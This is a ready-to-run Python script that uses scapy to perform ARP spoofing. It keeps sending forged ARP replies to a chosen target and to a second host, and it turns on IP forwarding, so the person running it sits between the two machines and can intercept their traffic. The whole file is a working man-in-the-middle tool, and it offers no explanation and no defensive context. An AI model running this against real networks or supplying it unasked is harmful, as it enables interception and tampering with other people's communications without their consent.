#!usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Please enter a Target IP")
    parser.add_option("-s", "--source", dest="source_ip", help="Please enter a Spoofing IP")
    options = parser.parse_args()[0]
    if not options.target_ip:
        parser.error("Please specify a Target IP address, use --help for more info.")
    elif not options.source_ip:
        parser.error("Please specify a Source IP address, use --help for more info.")
    else:
        return options


options = get_arguments()
sent_packets_count = 0
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
try:
    while True:
        spoof(options.target_ip, options.source_ip)
        spoof(options.source_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Ending Spoofer... Resetting ARP tables...")
    restore(options.target_ip, options.source_ip)
    restore(options.source_ip, options.target_ip)
    print("[-] ARP tables reset for: " + options.target_ip + " and " + options.source_ip + " successfully")
except IndexError:
    print("\n[-] Error: Target not online")